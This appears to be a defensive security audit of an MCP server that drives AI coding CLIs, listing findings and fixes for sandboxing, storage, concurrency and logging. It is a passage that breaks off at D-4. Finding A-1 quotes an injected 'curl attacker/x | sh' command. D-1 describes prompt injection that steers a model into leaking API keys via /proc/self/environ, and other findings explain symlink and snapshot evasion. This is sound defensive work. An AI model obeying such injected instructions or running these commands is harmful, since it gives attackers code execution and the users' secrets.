# Unison MCP Server — Adversarial Bug & Security Audit

**Audit date:** 2026-07-12
**Scope:** `clink/`, `providers/`, `tools/`, `utils/`, `handlers/`, `server.py`, `config.py`, `conf/`, `run-server.sh` (excludes `tests/`, `simulator_tests/`, vendored deps)
**Method:** 12 subsystem-focused adversarial finders read the actual code; every candidate finding was then handed to an independent skeptic agent whose default posture was to *refute* — it re-read the code path end-to-end and only confirmed a defect it could trace to a concrete, triggerable failure. The verification pass was then run **twice with independent skeptics** to catch borderline calls. Findings below are the survivors, tagged with their two-pass confidence. The most security-relevant items were additionally corroborated by hand.

## Results at a glance

| Severity | Confirmed (both passes) |
|----------|-------------------------|
| 🔴 High | 5 |
| 🟠 Medium | 14 |
| 🟡 Low | 20 |
| **Confirmed total** | **39** |
| 🔵 Disputed (passes split) | 4 |
| ⚪ Refuted (both passes) | 1 |

**Confidence tags:** findings marked **CONFIRMED** survived *both* independent skeptic passes. Four findings are **🔵 DISPUTED** — one pass confirmed, the other refuted — and are flagged inline; treat them as low-confidence. Notably, the second pass established that the MCP SDK validates tool arguments against the input schema and wraps every handler call in `try/except Exception` (`mcp/server/lowlevel/server.py:454-458, 500-501`, verified against the installed SDK), which downgrades several "crash/DoS" candidates to error-message-quality nits.

---

## 🛠️ Remediation progress

**Status: COMPLETE** — all 42 findings addressed (39 confirmed + 3 disputed cheap-hardening) on branch `fix/opus-audit-remediation`. Legend: ✅ fixed · 🔵 disputed (fixed as hardening) · ⬜ todo.

Verification: full unit suite green (`pytest -m "not integration"`), `ruff`/`black`/`isort` clean, `mypy` clean on touched strict-allowlist files, plus a new regression suite (`tests/test_opus_audit_regressions.py`) pinning the security-critical fixes. CHANGELOG.md and README.md updated.

| ID | Sev | Status | Note |
|----|-----|--------|------|
| A-1 | High | ✅ | Codex `--sandbox read-only` + strips bypass flag; honest metadata (`codex.py`, `clink.py`) |
| A-2 | Med | ✅ | `capture_snapshot` full-depth by default, entry-capped w/ warning (`fs_snapshot.py`) |
| A-3 | Med | ✅ | read-only path captures gitignored/transient via `include_ignored=True` (`fs_snapshot.py`, `clink.py`) |
| A-4 | Med | ✅ | `read_only_enforced` now reflects real layer-1 flags + coverage caveat (`clink.py`) |
| A-5 | Med | ✅ | `start_new_session`, `killpg` on timeout, bounded drain (`base.py`) |
| A-6 | Med | ✅ | reject `model` starting with `-` at boundary (`clink.py`) |
| A-7 | Low | ✅ | snapshot key adds `ctime_ns`; symlinks recorded not skipped (`fs_snapshot.py`) |
| A-8 | Low | 🔵✅ | parsers catch `RecursionError` (hardening) |
| A-9 | Low | ✅ | gemini parser rejects non-object payload (`parsers/gemini.py`) |
| A-10 | Low | ✅ | codex parser isinstance guards (`parsers/codex.py`) |
| A-11 | Low | ✅ | amp parser isinstance guards (`parsers/amp.py`) |
| A-12 | Low | ✅ | opt-in `UNISON_CLINK_STRIP_SECRETS` env hardening (`base.py`) — see F-1 |
| B-1 | High | ✅ | shared header constant + `_exec_ctx` signal detects embedded history (`simple/base.py`, `context_reconstructor.py`) |
| B-2 | High | ✅ | boundary preserves `remaining_tokens`/`original_user_prompt` via `dataclasses.replace` (`tool_handlers.py`) |
| B-3 | Low | ✅ | SQLite `atomic_update` (BEGIN IMMEDIATE) used by `add_turn` (`sqlite_storage.py`, `conversation_store.py`) |
| B-4 | Low | ✅ | DB dir 0700, file/WAL/SHM 0600, `.unison/.gitignore` (`sqlite_storage.py`) |
| B-5 | Low | ✅ | unknown-tool gate moved before reconstruction (`tool_handlers.py`) |
| C-1 | High | ✅ | per-instance `asyncio.Lock` + step-1 state reset (`workflow_mixin.py`) |
| C-2 | Med | ✅ | (same fix as C-1) |
| C-3 | Med | ✅ | hot paths use `await async_generate_content` (`simple/base.py`, `workflow_mixin.py`) |
| C-4 | Med | ✅ | `asyncio.Queue` live bridge + Gemini de-buffer + interval-floor throttle |
| C-5 | Low | ✅ | double-checked `_client_lock` (`openai_compatible.py`, `azure_openai.py`) |
| C-6 | Low | ✅ | HALF_OPEN reclaims leaked probe slot after timeout (`circuit_breaker.py`) |
| C-7 | Low | ✅ | `_is_provider_unhealthy_error` gate before `record_failure` (`base.py`) |
| C-8 | Low | ✅ | streaming overrides call allow_request/record_* (`gemini.py`, `openai_compatible.py`) |
| D-1 | High | ✅ | `/proc` `/sys` `/dev` `/run` blocked; docstring corrected (`security_config.py`, `file_utils.py`) |
| D-2 | Med | ✅ | image validation stats + size-checks before a hard-capped read (`image_utils.py`) |
| D-3 | Med | ✅ | chat writer uses `O_NOFOLLOW`/`O_TRUNC`, no write after failed open (`chat.py`) |
| D-4 | Med | ✅ | chat write dir now runs through `is_dangerous_path`/`is_home_directory_root` (`chat.py`) |
| E-1 | Med | ✅ | `_to_responses_content` maps text→input_text, images→input_image (`openai_compatible.py`) |
| E-2 | Med | ✅ | CUSTOM/AZURE added to `ModelRestrictionService.ENV_VARS` (`model_restrictions.py`) |
| E-3 | Low | ✅ | `_extract_usage` falls back to input/output_tokens; dead elif removed (`openai_compatible.py`) |
| E-4 | Low | ✅ | structured status-code checked before "429" substring (`openai_compatible.py`) |
| E-5 | Low | 🔵✅ | priority-order iteration + `setdefault` (`registry.py`) |
| E-6 | Low | ✅ | responses uses `max_output_tokens` (`openai_compatible.py`) |
| F-1 | Low | ✅ | opt-in `UNISON_CLINK_STRIP_SECRETS` (=A-12, `clink/agents/base.py`) |
| F-2 | Med | ✅ | responses logs metadata-only; redaction filter; `LOG_LEVEL` default INFO (`openai_compatible.py`, `logging_setup.py`, `server.py`, `.env.example`) |
| F-3 | Low | ✅ | DIAL client `follow_redirects=False` (`dial.py`) |
| F-4 | Low | ✅ | `_sanitize_for_log` on name/continuation_id/clientInfo (`tool_handlers.py`) |
| F-5 | Low | ✅ | `mask_secret_args` masks echoed keys (`run-server.sh`) |
| G-1 | Low | 🔵✅ | `_is_valid_uuid` non-string guard (`conversation_store.py`) |
| G-2 | Low | ✅ | `normalize_issues_found` validator coerces item fields (`base_models.py`) |

| Epic | Findings | Highest severity |
|------|----------|------------------|
| [A. clink subprocess & sandbox](#epic-a--clink-subprocess--sandbox) | 12 | 🔴 High |
| [B. Conversation storage & continuation](#epic-b--conversation-storage--continuation) | 5 | 🔴 High |
| [C. Reliability & concurrency](#epic-c--reliability--concurrency) | 8 | 🔴 High |
| [D. Path & filesystem sandbox](#epic-d--path--filesystem-sandbox) | 4 | 🔴 High |
| [E. Provider integration](#epic-e--provider-integration) | 6 | 🟠 Medium |
| [F. Secrets & logging](#epic-f--secrets--logging) | 5 | 🟠 Medium |
| [G. Input validation & crashes](#epic-g--input-validation--crashes) | 2 | 🟡 Low |

---

## Cross-cutting themes

Five root patterns generate most of the findings. Fixing the pattern is worth more than fixing each symptom:

1. **`read_only` is advertised as enforcement but is advisory.** The clink `read_only` flag reports `read_only_enforced: True` unconditionally, yet for four of seven CLIs there is *no* mechanical restriction at all, and the "verification" that backs it (a post-hoc filesystem snapshot diff) has depth, symlink, gitignore, and out-of-tree blind spots. It detects nothing about command execution and, even when it detects a write, the write already happened. The tool also returns `readOnlyHint: True` to the MCP client at all times — including when `read_only=False` — so clients may auto-approve it as "safe." (Epic A, Epic D)

2. **The file sandbox is a blocklist, not an allowlist.** `resolve_and_validate_path` blocks a handful of system dirs and the home root; its docstring claims "all file access is restricted to PROJECT_ROOT," which is false. `~/.ssh`, `~/.aws`, and Linux pseudo-files like `/proc/self/environ` (which leaks the server's own API keys) are readable. Writes are held to an even weaker standard than reads. (Epic D)

3. **Per-request state lives on registry-cached singletons.** Tools are cached one-instance-per-name, but each request mutates `self.*`. Across an `await`, a second request clobbers the first; across sessions, stale findings bleed into fresh conversations. (Epic C)

4. **Blocking work runs on the async event loop.** The two hottest provider paths call synchronous `generate_content` (with up to 17 s of `time.sleep` retry backoff) directly from `async def`, freezing the whole MCP server for every concurrent request. The correct `async_generate_content` wrapper already exists but is bypassed. (Epic C)

5. **`LOG_LEVEL` ships as `DEBUG` with no redaction.** The default install writes full model responses and prompt prefixes — including any credentials present in reviewed code — into `logs/mcp_server.log`, and control characters in tool names/ids are logged unsanitized. (Epic F)

---

## 🔴 Priority triage — do these first

| ID | Severity | One-liner |
|----|----------|-----------|
| [D-1](#d-1--procselfenviron-and-other-pseudo-files-leak-all-api-keys) | High | `/proc/self/environ` bypasses the read sandbox and exfiltrates every API key to the model |
| [A-1](#a-1--codex-runs-fully-unsandboxed-under-read_onlytrue) | High | `read_only=True` runs Codex with `--dangerously-bypass-approvals-and-sandbox`; prompt injection → arbitrary command execution |
| [C-1](#c-1--workflow-singleton-state-contaminates-across-sessions-and-concurrent-calls) | High | Workflow singleton state leaks findings/files across sessions and concurrent calls, and is persisted into the wrong thread |
| [B-1](#b-1--continuation-history-marker-mismatch-duplicates-every-turn) | High | Continuation marker mismatch persists the full enhanced prompt as a duplicate turn every exchange |
| [B-2](#b-2--mcp-boundary-wipes-continuation-context) | High | MCP boundary overwrites `_context`, causing spurious "prompt too large" errors and collapsing workflow file budgets to ~1k tokens |

---

## Epic A — clink subprocess & sandbox

`clink` spawns 7 external AI CLIs as subprocesses. This is the largest and most security-sensitive attack surface. The dominant issue: **`read_only` mode promises confinement it does not deliver.** Subprocesses are launched with `create_subprocess_exec` (no shell), so classic shell-metacharacter injection is not the risk — the risk is unsandboxed execution, flag smuggling, and a verification layer that produces false assurance.

### A-1 · Codex runs fully unsandboxed under `read_only=True`
**🔴 High · CONFIRMED · ✅ FIXED · `clink/agents/codex.py:19`, `tools/clink.py:336`**

> **Fixed:** `CodexAgent.get_read_only_args()` now returns `["--sandbox", "read-only"]` and a new `CodexAgent._apply_read_only()` strips `--dangerously-bypass-approvals-and-sandbox` / `--full-auto` / any `--sandbox`/`-s` pair before appending it. `tools/clink.py` now reports `read_only_enforced` = *whether a real layer-1 sandbox flag was applied* (no longer hard-coded `True`), plus a `read_only_enforcement` breakdown and `read_only_verification_coverage` caveat.

`CodexAgent.get_read_only_args()` returns `[]` and there is no `_apply_read_only` override, so nothing is added for read-only mode. Meanwhile the shipped manifest `conf/cli_clients/codex.json` hard-codes `--dangerously-bypass-approvals-and-sandbox` into `additional_args`, which `_build_command` appends unconditionally (`base.py:354`). That flag disables Codex's built-in filesystem sandbox **and** its shell-command approval prompt. Codex supports a real read-only sandbox (`--sandbox read-only`) that is never used.

- **Trigger:** A user calls clink `cli_name="codex", read_only=True` to review untrusted source. A prompt injection in a reviewed file ("run `curl attacker/x | sh`") is executed by Codex with no sandbox and no approval — arbitrary command execution, file write, or deletion on the host. The response still reports `read_only_enforced: True`; the snapshot diff cannot see command execution at all.
- **Fix:** Add `CodexAgent._apply_read_only()` that strips `--dangerously-bypass-approvals-and-sandbox` (and any `--full-auto`/`--sandbox <mode>` pair) then appends `["--sandbox", "read-only"]`. In `tools/clink.py:336`, do **not** report `read_only_enforced: True` when `agent.get_read_only_args()` is empty — report honest per-layer status instead.

### A-2 · Read-only snapshot is blind below 3 directory levels
**🟠 Medium · CONFIRMED · `utils/fs_snapshot.py:169`**

`capture_snapshot()` defaults to `max_depth=3` and `tools/clink.py` uses the default. Files with 4+ path components (e.g. `src/main/java/com/app/Secret.java`) never enter either snapshot and never appear in the diff. For the four CLIs whose *only* enforcement is the diff (codex, opencode, crush, amp), a write anywhere deeper than three levels produces no violation.

- **Fix:** Traverse the full tree for read-only verification (skip only gitignored/transient/symlink noise). If a bound is required, bound by entry count/wall-time and surface `read_only_verification="truncated"` so the tool never silently claims coverage it lacks.

### A-3 · Snapshot silently drops writes to gitignored/transient paths
**🟠 Medium · CONFIRMED · `utils/fs_snapshot.py:182`**

`capture_snapshot()` skips paths matching the root `.gitignore` or `TRANSIENT_PATTERNS` (`*.log`, etc.). Common `.gitignore` entries include `.env`, `*.key`, `dist/`, `secrets/`. A model can overwrite `.env` (injecting a malicious key/endpoint) or drop a `*.log` payload under `read_only=True` and **no violation is reported.**

- **Fix:** For read-only verification do not reuse the noise-reduction filter as the write-detection filter. Capture all files and route ignored writes into a distinct `ignored_writes` bucket, or restrict noise-filtering to the explicit per-CLI `fs_violation_ignore_patterns` mechanism. A noise filter must not double as a silent evasion channel.

### A-4 · Verification covers a single shallow root; out-of-tree writes are invisible yet reported clean
**🟠 Medium · CONFIRMED · `tools/clink.py:306`**

The snapshot root is `working_dir` (defaulting to `.`), but the CLI operates on arbitrary absolute paths. A write to `~/.ssh/authorized_keys`, `$HOME/.zshrc`, or a sibling repo is entirely outside the diff's field of view, while metadata still reports `read_only_enforced: True`.

- **Fix:** Stop reporting `read_only_enforced: True` unconditionally; expose per-layer status and a `verification_coverage: "working_dir_only"` caveat. Prefer a real OS-level sandbox (e.g. `sandbox-exec`/Seatbelt) for genuine confinement — a post-hoc single-root diff cannot substitute.

### A-5 · Timeout kill orphans descendants; untimed cleanup drain can hang forever
**🟠 Medium · CONFIRMED · `clink/agents/base.py:278`**

The subprocess is spawned without `start_new_session`, so on timeout `process.kill()` signals only the direct child; descendant processes (agentic CLIs routinely spawn shells/helpers) are orphaned. Worse, the follow-up `await process.communicate()` has no timeout — if any survivor still holds the inherited stdout/stderr pipe, EOF never arrives and the request hangs indefinitely, defeating the timeout entirely.

- **Fix:** Spawn in a new process group (`start_new_session=True`; `CREATE_NEW_PROCESS_GROUP` on Windows). On timeout `os.killpg(...)` the whole group, then bound the drain with `asyncio.wait_for(process.communicate(), timeout=5)`.

### A-6 · Gemini `model="--yolo"` corrupts the read-only command
**🟠 Medium · CONFIRMED · `clink/agents/gemini.py:31`**

Gemini's manifest declares no `supported_models` allowlist, so the attacker-influenced `model` value is only `.strip()`'d. `render_model_args` emits `["--model", model]`. `_apply_read_only` then strips *every* `--yolo`/`-y` token by value equality — including the model **value** — leaving a dangling `--model` that swallows the appended `--approval-mode`, so `plan` mode never activates. Metadata still claims `read_only_enforced: True`.

- **Fix:** Strip conflicting `--yolo`/`-y` from config args *before* model args are appended (by index, not blanket value-equality). Reject `model` values beginning with `-`, or emit `--model=<value>` as a single token. Derive `read_only_sandbox_flags` from what was actually applied.

### A-7 · Modification detection uses `(mtime_ns, size)` and skips symlinks — trivially evadable
**🟡 Low · CONFIRMED · `utils/fs_snapshot.py:192`**

A CLI that edits a file's content but preserves byte length and restores the original mtime (`os.utime`) produces an identical tuple and is not flagged. Symlinks are skipped entirely, so writing *through* a symlink is invisible.

- **Fix:** Hash content (or include inode/ctime) for read-only verification; follow or record symlinks.

### A-8 · Deeply nested JSON from a CLI bypasses the `ParserError` contract
**🟡 Low · 🔵 DISPUTED · `clink/parsers/claude.py:21` (all 5 JSON parsers)**

All JSON-based parsers catch only `json.JSONDecodeError`. Deeply nested input raises `RecursionError`, which is not a subclass — it escapes the `ParserError`/`CLIAgentError` chain as an opaque error stripped of CLI diagnostics.

- **Dispute:** The first skeptic confirmed this as a low bug; the second refuted the crash/DoS framing. The `RecursionError` *is* caught by the MCP SDK's `try/except Exception` (`server.py:500`), so it degrades to a normal error response — **no process crash or server DoS.** Also, the CLIs emit a fixed shallow JSON envelope and attacker-controlled model text becomes a string value, not nested containers, so only a malicious/buggy CLI (which already runs code as the user) could trigger it. **Residual = degraded error-message quality only; treat as a hardening nit, not a real defect.**
- **Fix (optional hardening):** Broaden the guard to `except (json.JSONDecodeError, RecursionError, ValueError)` and re-raise as `ParserError` so the clean diagnostics path is preserved.

### A-9 · Gemini parser lacks a top-level shape check
**🟡 Low · CONFIRMED · `clink/parsers/gemini.py:25`**

`payload = json.loads(stdout)` is annotated `dict` but not runtime-checked, then `payload.get(...)` is called. Any valid non-object JSON (array/string/number) raises `AttributeError`, bypassing structured error handling.

- **Fix:** After `json.loads`, `if not isinstance(payload, dict): raise ParserError(...)` — mirror the check already in `claude.py:28-44`.

### A-10 · Codex JSONL parser crashes on non-dict `item`
**🟡 Low · CONFIRMED · `clink/parsers/codex.py:34`**

`item = event.get("item") or {}` returns the raw value when truthy; a non-dict `item` (string/list/number) then makes `item.get("type")` raise `AttributeError`.

- **Fix:** `item = event.get("item"); if isinstance(item, dict) and item.get("type") == "agent_message":`.

### A-11 · Amp parser crashes on non-dict `message`
**🟡 Low · CONFIRMED · `clink/parsers/amp.py:57`**

Same `x or {}`-then-`.get` anti-pattern: a truthy non-dict `message` raises `AttributeError`, losing error metadata.

- **Fix:** `message = event.get("message"); if not isinstance(message, dict): continue` (also protects `message.get("usage")` at line 66).

### A-12 · Full server environment propagated to every spawned CLI
**🟡 Low · CONFIRMED · `clink/agents/base.py:364`** — *same root cause as [F-1](#f-1--all-provider-api-keys-are-inherited-by-every-clink-spawned-cli); see there for the fix.*

`_build_environment` does `os.environ.copy()`, handing every configured provider key (including `.env`-loaded secrets the user's shell never had) to every third-party CLI subprocess.

---

## Epic B — conversation storage & continuation

Two high-severity logic bugs in the continuation path corrupt conversation state and inflate token spend on *every* multi-turn interaction routed through the MCP server. These are correctness bugs with real user-facing impact, not edge cases.

### B-1 · Continuation history-marker mismatch duplicates every turn
**🔴 High · CONFIRMED · ✅ FIXED · `tools/simple/base.py:338`**

> **Fixed:** exported `CONVERSATION_HISTORY_HEADER`/`CONVERSATION_HISTORY_HEADER_PREFIX` from `context_reconstructor.py` and use the prefix (plus the authoritative `_exec_ctx.original_user_prompt` signal) in `SimpleTool.execute` to detect server-embedded history, so a continuation no longer double-records the user turn or nests the history.

The server builds history with the header `=== CONVERSATION HISTORY (CONTINUATION) ===` (`context_reconstructor.py:457`), but `SimpleTool.execute` checks `if "=== CONVERSATION HISTORY ===" in field_value:` — a substring that **never** matches. So on every server-routed continuation of a simple tool (e.g. chat), it takes the "no embedded history" branch and (1) stores the *entire* enhanced prompt (full history + embedded file contents + follow-up instructions) as a new user turn even though the server already recorded the real turn, and (2) rebuilds history around a prompt that already embeds history, sending the model nested duplicates.

- **Impact:** Each exchange burns 3 turns instead of 2 (thread exhausts `MAX_CONVERSATION_TURNS=50` at ~16 exchanges); stored turns grow until they saturate the history-token budget (MBs per turn on large-context models, persisted to disk under `STORAGE_BACKEND=sqlite`); real older turns get evicted; API spend inflates every call.
- **Fix:** Treat the server-injected `ToolExecutionContext` (`_exec_ctx.original_user_prompt is not None`) as authoritative proof that history is pre-embedded and the user turn already recorded. If a string check must remain, export the real header as a shared constant. In the genuine in-process fallback, `add_turn` must record the *original* user prompt, never the enhanced one.

### B-2 · MCP boundary wipes continuation `_context`
**🔴 High · CONFIRMED · ✅ FIXED · `handlers/tool_handlers.py:193`**

> **Fixed:** the boundary now `dataclasses.replace()`s the existing reconstructed context (preserving `remaining_tokens` and `original_user_prompt`) instead of building a fresh one, and the dead `_remaining_tokens` debug check was removed.

`reconstruct_thread_context()` builds an enriched `ToolExecutionContext` with `remaining_tokens` and `original_user_prompt`, but for every model-requiring tool, lines 193-197 unconditionally replace `arguments["_context"]` with a fresh context that omits those fields, reverting them to defaults (`remaining_tokens=0`, `original_user_prompt=""`). The dead `"_remaining_tokens" in arguments` check at line 123 confirms the incomplete refactor.

- **Impact 1:** `original_user_prompt` is now always empty on continuations, so size validation runs against the *enhanced* prompt (history + input) vs `MCP_PROMPT_SIZE_LIMIT` (60 000 chars) — producing a spurious "prompt too large" error for a one-sentence follow-up once history is large. **Impact 2:** workflow-tool continuations get `remaining_tokens=0`, which `file_processor` clamps to a 1 000-token file budget, silently truncating nearly all `relevant_files` out of the expert-analysis prompt.
- **Fix:** In `handle_call_tool`, capture the existing context before overwriting and preserve `remaining_tokens`/`original_user_prompt` (e.g. `dataclasses.replace(existing, model_context=..., resolved_model_name=...)`). Delete the dead check at 123-127. Harden `workflow_mixin.py:548` to treat `0` as unset.

### B-3 · `add_turn` is a non-atomic read-modify-write
**🟡 Low · CONFIRMED · `utils/conversation_store.py:280`**

`add_turn()` does SELECT → append in Python → full-row UPSERT with no transaction spanning read and write. Safe within one process (no awaits, single event-loop thread), but two server processes sharing one SQLite DB (per-project `.unison/conversations.db`) will lose turns under interleaving.

- **Fix:** Add an atomic read-modify-write to the storage layer: `BEGIN IMMEDIATE; SELECT; mutate; UPDATE; COMMIT` under the connection lock.

### B-4 · SQLite conversation DB written world-readable with no gitignore
**🟡 Low · CONFIRMED · `utils/sqlite_storage.py:31`**

Under `STORAGE_BACKEND=sqlite`, all prompts, responses, referenced paths, and (amplified by [B-1](#b-1--continuation-history-marker-mismatch-duplicates-every-turn)) embedded file contents are written as plaintext JSON to `<cwd>/.unison/conversations.db` (+ `-wal`/`-shm`) with umask-default permissions and no `.gitignore` — risking accidental commit and local disclosure.

- **Fix:** `mkdir(mode=0o700)` + `chmod 0o600` the DB and sidecars; drop a `.unison/.gitignore` containing `*` on creation.

### B-5 · User turn persisted before validation gates
**🟡 Low · CONFIRMED · `handlers/tool_handlers.py:101`**

`reconstruct_thread_context` (which appends the user turn via `add_turn`) runs *before* the unknown-tool check (line 130) and model-availability checks (169-187). A valid `continuation_id` with an unknown/disabled tool or unavailable model still records an orphan user turn, burning turn-budget slots.

- **Fix:** Perform the cheap gate checks (tool availability, model resolution) before any stateful reconstruction work.

---

## Epic C — reliability & concurrency

The MCP SDK dispatches every request as a concurrent task. Two structural mismatches with that model — mutable singleton state and blocking calls on the event loop — undermine correctness and availability under any real concurrency.

### C-1 · Workflow singleton state contaminates across sessions and concurrent calls
**🔴 High · CONFIRMED · ✅ FIXED · `tools/simple/base.py:321`, `tools/workflow/workflow_mixin.py:624`**

> **Fixed:** `execute_workflow` now wraps its body in a per-instance `asyncio.Lock` (serializing concurrent calls to the same registry-cached tool) and resets `work_history`/`consolidated_findings` on a fresh step-1 conversation (mirroring `ConsensusTool`), so sequential sessions no longer inherit stale state and concurrent sessions can't clobber each other mid-`await`.

`ToolRegistry` caches one instance per tool, but `BaseWorkflowMixin` keeps all per-request work on `self.*` (`work_history`, `consolidated_findings`, `_model_context`, `_current_arguments`). Two problems:
- **Sequential bleed (no concurrency needed):** `execute_workflow` never resets these on a fresh step-1 call (only `consensus.py` resets). A brand-new codereview session inherits the previous session's findings — inflating status counts, poisoning the expert-analysis prompt, and persisting merged state into the new thread.
- **Concurrent race:** streaming-enabled tools (analyze/codereview/thinkdeep) yield the loop at `await asyncio.to_thread(_run_stream)`; a parallel request to the same tool overwrites `self.*` during the window, so request A builds its completion summary from B's findings and stores B's `work_history` into A's thread.

- **Fix:** Make workflow state request-scoped — build a local state object in `execute_workflow` and thread it through `handle_work_completion`/`_call_expert_analysis`/`store_conversation_turn`. Short-term: reset state in the fresh-conversation branch (mirroring `consensus.py:456-457`) and snapshot into locals before the first `await`. (Note: the analogous simple-tool race is *refuted* — `SimpleTool.execute` has no await between its `self.*` writes and reads because `generate_content` is synchronous, which is itself [C-3](#c-3--blocking-generate_content-called-on-the-async-event-loop).)

### C-2 · Workflow per-request state on cached singletons (companion to C-1)
**🟠 Medium · CONFIRMED · `tools/workflow/workflow_mixin.py:624`**

The workflow-mixin view of the same defect: `self._current_arguments`, `self.work_history`, `self.consolidated_findings`, `self._embedded_file_content` all live on the shared singleton and are read after the `await self.handle_work_completion(...)` / `to_thread(_run_stream)` suspension points, so concurrent same-tool calls corrupt completion summaries and persisted thread state.

- **Fix:** Same as [C-1](#c-1--workflow-singleton-state-contaminates-across-sessions-and-concurrent-calls). Track and fix together.

### C-3 · Blocking `generate_content` called on the async event loop
**🟠 Medium · CONFIRMED · `tools/simple/base.py:448`, `tools/workflow/workflow_mixin.py:1608`**

`SimpleTool.execute` (`async def`) and `WorkflowTool._call_expert_analysis` call the blocking `provider.generate_content(...)` directly. It runs `_run_with_retries` — up to 4 blocking HTTP round-trips plus `time.sleep` backoff totalling ~17 s. While one call is in flight the entire event loop freezes: no ping/cancellation handling, no progress, all concurrent tool calls stall.

- **Fix:** Call `await provider.async_generate_content(...)` (already exists, wraps `asyncio.to_thread`) at `tools/simple/base.py:448` & `:505` and `tools/workflow/workflow_mixin.py:1608` — matching what `consensus.py:666` and the streaming path already do.

### C-4 · Streaming buffers the whole response, then bursts notifications
**🟠 Medium · CONFIRMED · `tools/workflow/workflow_mixin.py:1501`**

`_run_stream()` exhausts the provider generator into a list inside `asyncio.to_thread` before any `notify_chunk` fires, and Gemini's provider `list(stream_response)` double-buffers. Net effect for streaming tools: **zero** progress during a minutes-long generation (defeating the keepalive purpose), then a burst of ~`len(response)/50` notifications fired back-to-back at completion.

- **Fix:** Bridge chunks from the worker thread to the loop as they arrive (`asyncio.Queue` via `loop.call_soon_threadsafe`); remove Gemini's `list()` materialization; add a wall-clock throttle to `StreamProgressNotifier`.

### C-5 · Unlocked lazy client init + global `os.environ` mutation race
**🟡 Low · CONFIRMED · `providers/openai_compatible.py:265`**

The `client` property does an unlocked check-then-act plus global `os.environ` mutation; concurrent consensus dispatch races on construction. `providers/azure_openai.py:236-269` has the identical pattern.

- **Fix:** Apply the double-checked-locking pattern `providers/dial.py:72` already uses; better, eliminate the global-state mutation.

### C-6 · Circuit breaker HALF_OPEN has no timeout escape
**🟡 Low · PLAUSIBLE · `utils/circuit_breaker.py:103`**

Only the OPEN branch has time-based recovery. The HALF_OPEN slot is released solely by an explicit `record_success`/`record_failure`; a probe that neither succeeds nor fails (e.g. `CancelledError` in the advertised, currently-uncalled `_run_with_retries_async`) leaks the slot and wedges the provider permanently.

- **Fix:** Record `_half_open_entered_at`; in the HALF_OPEN branch reset the in-flight count once `elapsed >= reset_timeout_seconds`, mirroring the OPEN branch. Ensure probe slots are released in a `finally`.

### C-7 · Circuit breaker counts caller-fault 4xx as provider failures
**🟡 Low · CONFIRMED · `providers/base.py:606`**

`_run_with_retries` calls `record_failure()` for *any* non-retryable exception, not distinguishing provider-health failures (5xx/timeouts) from request-content errors (400 `context_length_exceeded`, invalid image). Five consecutive content errors lock out a *healthy* provider for 60 s, renewably.

- **Fix:** Only `record_failure()` for provider-unhealth signals (timeouts, connection errors, 5xx/408/529, exhausted retryable-429s). Treat non-retryable 4xx as neutral for the breaker.

### C-8 · Native streaming overrides bypass the circuit breaker and retries
**🟡 Low · CONFIRMED · `providers/gemini.py:384`, `providers/openai_compatible.py`**

The breaker is enforced only inside `_run_with_retries[_async]`, which wraps `generate_content`. The native `generate_content_stream()` overrides don't go through it, so a dead provider is never fail-fasted on the streaming path and stream failures never update breaker/health state.

- **Fix:** Wrap the streaming overrides with the same discipline: `allow_request()` at the top (raise `ProviderUnavailable`), `record_success()` after the final chunk, `record_failure()` in except paths.

---

## Epic D — path & filesystem sandbox

The file sandbox is documented as PROJECT_ROOT confinement but implemented as a small blocklist. Reads escape it; writes are checked even more weakly than reads.

### D-1 · `/proc/self/environ` (and other pseudo-files) leak all API keys
**🔴 High · CONFIRMED · ✅ FIXED · `utils/security_config.py:12`**

> **Fixed:** added `/proc`, `/sys`, `/dev`, `/run` to `DANGEROUS_SYSTEM_PATHS` (blocks the path and all descendants), and corrected the `file_utils.py` "Security Model" docstring to describe the actual blocklist (not a PROJECT_ROOT allowlist). Device/FIFO paths were already rejected by the existing `is_file()` guard; the pseudo-file gap is now closed.

`DANGEROUS_SYSTEM_PATHS` omits `/proc`, `/sys`, `/dev`. There is no allowlist despite `file_utils.py:16` claiming PROJECT_ROOT confinement. `/proc/self/environ` passes `resolve_and_validate_path` (not blocked), passes `is_file()` (it is `S_IFREG` on Linux), and passes the size guard (`st_size == 0`), so `f.read()` returns the full NUL-separated environment.

- **Trigger:** On a Linux deployment (the standard Docker/prod target), the server is launched by the MCP client with all keys in its environment (`run-server.sh` registers `claude mcp add unison -e GEMINI_API_KEY=... -e OPENAI_API_KEY=... ...`). A tool receives `/proc/self/environ` in its file list — directly, or via prompt-injection in a source file that instructs the model to add it to the next step — and `read_file_content` embeds the contents into the prompt sent to the model provider, exfiltrating every configured secret (including cross-provider leakage and capture in provider-side prompt logs). Same bypass reads `/proc/self/cmdline`, `/proc/<pid>/environ`, etc.
- **Fix:** Add `/proc`, `/sys`, `/dev`, `/run` to `DANGEROUS_SYSTEM_PATHS`. **Preferred:** replace the blocklist with a positive allowlist — require the resolved target to be `is_relative_to` an approved root before reading. Harden `read_file_content` to reject non-regular/zero-size special files. Fix the false docstring.

### D-2 · `validate_image` reads the whole file before any size/type check
**🟠 Medium · CONFIRMED · ✅ FIXED · `utils/image_utils.py:70`**

`_validate_file_path` calls `handle.read()` (entire file into memory) *before* checking extension or size, with no path sandbox and no regular-file check. The tool-level pre-check uses `stat().st_size`, which is `0` for devices/FIFOs/`/proc`.

- **Trigger:** An `images` argument (crafted call or prompt-injected output) of `/dev/zero` — no `.png` or symlink needed since the extension check runs after the read — grows the buffer until MemoryError/OOM. A FIFO with no writer makes `open()` block forever, hanging the request. A multi-GB `.png` is fully buffered before the size limit is consulted.
- **Fix:** `stat` and reject non-`S_ISREG` and oversize *before* opening; validate extension before opening; read with a hard `max_bytes+1` cap; route through `resolve_and_validate_path`.

### D-3 · chat artifact writer follows symlinks (CWE-59 / TOCTOU)
**🟠 Medium · CONFIRMED · ✅ FIXED · `tools/chat.py:343`**

`_persist_generated_code_block` writes `pal_generated.code` into the caller-supplied `working_directory`. It relies on `unlink()` to defuse a pre-existing symlink but swallows the `OSError` and then unconditionally `write_text()`s (which follows symlinks); there is also a TOCTOU gap between unlink and write.

- **Trigger:** If the working dir is attacker-writable (sticky dir like `/tmp`, shared dir, or a crafted checkout the agent is pointed at), an attacker plants a `pal_generated.code` symlink. Sticky-dir case: `unlink` fails EPERM (swallowed) → `write_text` follows the symlink and overwrites the target (e.g. `~/.ssh/authorized_keys`); dangling-symlink case: `exists()` is False → unlink skipped → `write_text` creates the target. Content is model output, steerable via prompt injection.
- **Fix:** `lstat` the final path and abort if it is a symlink/non-regular file; open with `os.open(..., O_CREAT|O_EXCL|O_NOFOLLOW, 0o600)` or write-to-temp + `os.replace`; never write after a failed unlink.

### D-4 · chat writes bypass the read-side dangerous-path sandbox
